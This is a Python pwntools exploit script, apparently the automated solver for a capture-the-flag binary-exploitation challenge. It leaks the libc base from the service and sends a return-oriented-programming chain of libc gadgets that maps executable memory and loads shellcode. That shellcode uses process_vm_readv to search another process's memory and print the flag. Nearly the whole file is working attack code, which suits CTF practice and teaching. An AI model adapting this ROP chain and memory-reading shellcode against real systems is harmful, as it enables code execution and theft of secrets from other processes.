from pwn import *

#
# INIT
#
context.arch = "amd64"
libc = ELF(os.path.join(os.path.dirname(__file__), "glibc/libc.so.6"), False)

#
# GADGETS
#

# return from game has LSB == 0x5f so we need to find a gadget with same LSB
INIT_GADGET = 0x17aa72                  # ret;
POP_RAX = 0xd2cb7                       # pop rax; ret;
POP_RDI = 0x2493d                       # pop rdi; ret;
POP_RSI = 0x1160b1                      # pop rsi; ret;
POP_RDX_RBX_R12_RBP = 0xa1ff2           # pop rdx; adc al, 0; pop rbx; pop r12; pop rbp; ret;
POP_RCX = 0x11b53e                      # pop rcx; ret;
XOR_R8D_R8D = 0x9b166                   # xor r8d, r8d; ret;
XOR_R8D_EAX_POP_RBX_R12_RBP = 0x12a7a4  # xor r8d, eax; pop rbx; pop r12; pop rbp; ret;

#
# SHELLCODE
#
shellcode = """
    jmp main
get_child_pid:
    mov rax, [rsp-0x1d8]
    add rax, 0x372c
    mov rax, [rax]
    lea rbx, [rip+child_pid]
    mov [rbx], eax
    ret
do_process_vm_readv:
    mov rdi, [rip+child_pid]
    lea rsi, [rip+local_iov]
    mov rdx, 1
    lea r10, [rip+remote_iov]
    mov r8, 1
    mov r9, 0
    mov rax, 0x136
    syscall
    ret
main:
    call get_child_pid
find_mapping:
    lea rax, [rip+curr_page]
    lea rbx, [rip+remote_iov]
    mov rdx, [rax]
    mov [rbx], rdx
    call do_process_vm_readv
    cmp rax, -14
    jne search_flag
    lea rax, [rip+curr_page]
    mov rdx, [rax]
    add rdx, 0x100000
    mov [rax], rdx
    mov rcx, 0x100000000
    cmp rdx, rcx
    jb find_mapping
    jmp exit
check_flag:
    mov rax, 0x31337f00
    mov bl, [rax]
    cmp bl, 0x0
    jne print_flag
    ret
search_flag:
    call check_flag
    lea rax, [rip+curr_size]
    mov rdx, [rax]
    shr rdx, 1
    cmp rdx, 0x1000
    jb print_flag
    mov [rax], rdx
    lea rax, [rip+curr_page]
    mov rbx, [rax]
    sub rbx, rdx
    mov [rax], rbx
    lea rax, [rip+remote_iov]
    mov [rax], rbx
    call do_process_vm_readv
    cmp rax, -14
    je handle_mapping_failure
    jmp search_flag
handle_mapping_failure:
    lea rax, [rip+curr_page]
    mov rdx, [rax]
    lea rax, [rip+curr_size]
    mov rbx, [rax]
    add rdx, rbx
    lea rax, [rip+curr_page]
    mov [rax], rdx
    lea rax, [rip+remote_iov]
    mov [rax], rdx
    jmp search_flag
print_flag:
    mov rdi, 1
    mov rsi, 0x31337f00
    mov rdx, 0x100
    mov rax, 1
    syscall
exit:
    mov rax, 60
    xor edi, edi
    syscall
curr_size:
    .quad 0x100000
curr_page:
    .quad 0x100000
child_pid:
    .quad 0
local_iov:
    .quad 0x31337f00
    .quad 0x100
remote_iov:
    .quad 0
    .quad 0x100
    """


#
# FUNCTIONS
#
def send_rop(rop):
    # Skip the first byte because of alignment
    rop = rop[1:]
    # send 16 bytes at a time
    for i in range(0, len(rop), 16):
        payload = rop[i:i+16]
        if len(payload) < 16:
            payload = payload.ljust(16, b"\x00")
        io.sendafter(b"> ", payload)
    io.sendlineafter(b"> ", b"END")

#
# EXPLOIT
#
def exploit(HOST, PORT):
    global io
    io = remote(HOST, PORT)

    POW_BYPASS = b'99:27363338f2bb7c3efbe621c882dea0af'

    io.sendlineafter(b"Result: ", POW_BYPASS)

    # Libc leak
    io.recvuntil(b"hint: ")
    libc.address = int(io.recvline(False), 16) - libc.sym["read"]
    success(f"libc base: {hex(libc.address)}")

    info("Waiting for first timeout to interrupt the read...")

    io.sendlineafter(b"hurry up!\n", b"\x04" + b"A"*8)

    success("Timeout triggered, sending ROP chain...")

    # ROP chain
    rop = p64(libc.address + INIT_GADGET)
    # mmap(0x31337000, 0x1000, 7, 0x22, -1, 0)
    rop += p64(libc.address + POP_RDI)
    rop += p64(0x31337000)
    rop += p64(libc.address + POP_RSI)
    rop += p64(0x1000)
    rop += p64(libc.address + POP_RDX_RBX_R12_RBP)
    rop += p64(7) * 4
    rop += p64(libc.address + POP_RAX)
    rop += p64(0xffffffff)
    rop += p64(libc.address + XOR_R8D_R8D)
    rop += p64(libc.address + XOR_R8D_EAX_POP_RBX_R12_RBP)
    rop += p64(0xdeadbeef) * 3
    rop += p64(libc.address + POP_RCX)
    rop += p64(0x22)
    rop += p64(libc.sym["mmap"])
    # read(0, 0x31337000, 0x1000)
    rop += p64(libc.address + POP_RDI)
    rop += p64(0)
    rop += p64(libc.address + POP_RSI)
    rop += p64(0x31337000)
    rop += p64(libc.address + POP_RDX_RBX_R12_RBP)
    rop += p64(0x1000) * 4
    rop += p64(libc.sym["read"])
    # jump to mmaped shellcode
    rop += p64(0x31337000)
    send_rop(rop)

    sleep(1)

    shellcode_asm = asm(shellcode)
    io.sendafter(b"Game over!\n", shellcode_asm)

    flag = io.recvuntil(b"}")
    return flag.decode()


if __name__ == "__main__":
    print("You should not run this script directly, run checker/__main__.py instead.")
